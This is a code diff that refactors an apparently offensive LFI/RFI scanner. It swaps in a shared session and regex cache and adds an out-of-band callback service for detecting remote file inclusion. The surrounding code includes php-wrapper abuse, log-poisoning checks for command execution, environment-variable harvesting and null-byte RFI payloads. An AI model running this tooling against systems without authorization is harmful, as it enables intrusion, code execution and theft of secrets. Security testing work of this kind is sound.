@@ -27,6 +27,8 @@ import urllib.parse
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
+from core.shared_infra import shared_session, regex_cache, oob_provider
+
 # ============================================================================
 # LFI/RFI PAYLOAD DATABASE (from PayloadsAllTheThings + LFITester + LFIHunt)
 # ============================================================================
@@ -162,13 +164,7 @@ class LFIEngine:
         self.proxy = proxy
         self.timeout = timeout
         self.threads = threads
-        self.session = requests.Session()
-        self.session.verify = False
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36'
-        })
-        if proxy:
-            self.session.proxies = {'http': proxy, 'https': proxy}
+        self.session = shared_session
         self.findings = []
         self.injected_params = []
 
@@ -205,7 +201,7 @@ class LFIEngine:
             if file_type and sig_name != file_type:
                 continue
             for pattern in patterns:
-                if re.search(pattern, text, re.IGNORECASE | re.MULTILINE):
+                if regex_cache.search(pattern, text, re.IGNORECASE | re.MULTILINE):
                     matches.append(sig_name)
                     break
         return list(set(matches))
@@ -303,7 +299,7 @@ class LFIEngine:
                 if wrapper_name in ["filter_base64", "pharaoh"]:
                     try:
                         # Extract base64 content from response
-                        b64_match = re.search(r'[A-Za-z0-9+/]{20,}={0,2}', content)
+                        b64_match = regex_cache.search(r'[A-Za-z0-9+/]{20,}={0,2}', content)
                         if b64_match:
                             decoded = base64.b64decode(b64_match.group()).decode('utf-8', errors='ignore')
                             results["wrappers_working"].append({
@@ -412,7 +408,7 @@ class LFIEngine:
                     # Check if command output is in response
                     cmd_patterns = [r"uid=\d+", r"gid=\d+", r"total \d+", r"Volume"]
                     for pattern in cmd_patterns:
-                        match = re.search(pattern, resp.text)
+                        match = regex_cache.search(pattern, resp.text)
                         if match:
                             results["rce_achieved"] = True
                             results["poisoned_logs"].append({
@@ -443,7 +439,7 @@ class LFIEngine:
             resp = self._inject_payload(payload)
             if resp and resp.status_code == 200:
                 # Check for environment variables
-                env_matches = re.findall(r'(\w+)=([^\x00\n]+)', resp.text)
+                env_matches = regex_cache.findall(r'(\w+)=([^\x00\n]+)', resp.text)
                 if env_matches and len(env_matches) > 3:
                     results["environ_leaked"] = True
                     results["env_vars"] = [(k, v[:50]) for k, v in env_matches[:20]]
@@ -503,7 +499,7 @@ class LFIEngine:
     # SCAN 7: RFI Testing
     # ========================================================================
 
-    def detect_rfi(self, callback_url="http://127.0.0.1:8888/payload.txt"):
+    def detect_rfi(self, callback_url=None):
         """Test for Remote File Inclusion"""
         results = {
             "vulnerable": False,
@@ -511,12 +507,16 @@ class LFIEngine:
             "callback_received": False,
         }
 
+        # Use OOB provider for dynamic callback instead of hardcoded localhost
+        oob_provider.initialize()
+        payload_id = oob_provider.generate_payload_id()
+        callback_url = callback_url or oob_provider.get_callback_url(payload_id)
+
         rfi_payloads = [
             callback_url,
             f"{callback_url}%00",
             f"{callback_url}?%00",
             f"{callback_url}%",
-            f"http://127.0.0.1:8888/payload.txt",
         ]
 
         for payload in rfi_payloads:
@@ -525,8 +525,13 @@ class LFIEngine:
                 "payload": payload,
                 "status": resp.status_code if resp else "error",
             })
-            # RFI detection requires OOB callback verification
-            # In production, this would check interactsh/callback server
+
+        # Poll OOB provider for callback interactions
+        interactions = oob_provider.check_interactions(payload_id)
+        if interactions:
+            results["callback_received"] = True
+            results["vulnerable"] = True
+            results["oob_interactions"] = interactions
 
         return results
 
